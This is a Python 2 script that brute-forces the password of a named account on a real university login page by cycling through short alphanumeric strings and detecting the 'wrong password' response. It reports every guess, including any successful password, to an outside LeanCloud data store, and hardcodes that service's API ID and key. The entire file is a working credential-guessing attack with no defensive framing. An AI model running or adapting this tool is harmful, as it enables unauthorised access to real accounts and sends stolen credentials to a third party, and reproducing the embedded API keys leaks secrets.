# -*- coding:utf-8 -*- 
import requests
url = 'http://www.seiee.sjtu.edu.cn/login.action'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
form = {'request_locale': 'zh_CN', 'loginForm.captcha': '',
			'loginForm.name': 'seiee', 'loginForm.password': 'xsb',
			'encodedPassword': '','submitButton': '%E7%99%BB%E5%BD%95'}

data_headers = {'Content-Type': 'application/json',
				'X-LC-Id': 'JdIjAFdw7blyyGyewkG15rjL',
				'X-LC-Key': '7UC8JpfIllUKc0XazouoOJUX'
				}
data_url = 'https://leancloud.cn/1.1/classes/keylib'
x = requests.post(url= data_url, json = {'key':'xsb', 'status': "error"}, headers = data_headers)
print x.content


keybase = ['0','1','2','3','4','5','6','7','8','9'] \
			+ ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'] \
			+ ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

class KEY:
	def __init__(self, maxLength):
		self.maxLength = maxLength
		self.maxDigit = len(keybase)
		self.arr = [0] * ( maxLength + 1)
		#use 1 more digit to represent out of range

	def __repr__(self):
		key = ""
		for i in range (0, self.maxLength):
			key += keybase[self.arr[i + 1]]
		return key

	def increase(self):
		carry = 1
		for i in range (0, self.maxLength + 1):
			self.arr[self.maxLength - i] += carry
			if self.arr[self.maxLength - i] == self.maxDigit:
				self.arr[self.maxLength - i] = 0
				carry = 1
			else:
				break
		if self.arr[0] == 0:
			return True
		else:
			return False

	def string(self):
		key = ""
		for i in range (0, self.maxLength):
			key += keybase[self.arr[i + 1]]
		return key



def main():
	keybaseLength = len(keybase)
	for maxLength in range (1,3):
		key = KEY(maxLength)
		while True:
			keyStr = key.string()
			print "now deal with " + keyStr
			form['loginForm.password'] = keyStr
			r = requests.post(url = url,data = form, headers = headers).content
			if r.find('密码错误') == -1:
				requests.post(url= data_url, json = {'key': keyStr, 'status': "success"}, headers = data_headers)
			else:
				requests.post(url= data_url, json = {'key': keyStr, 'status': "error"}, headers = data_headers)
			if key.increase() == False:
				break


if __name__ == '__main__':
	main()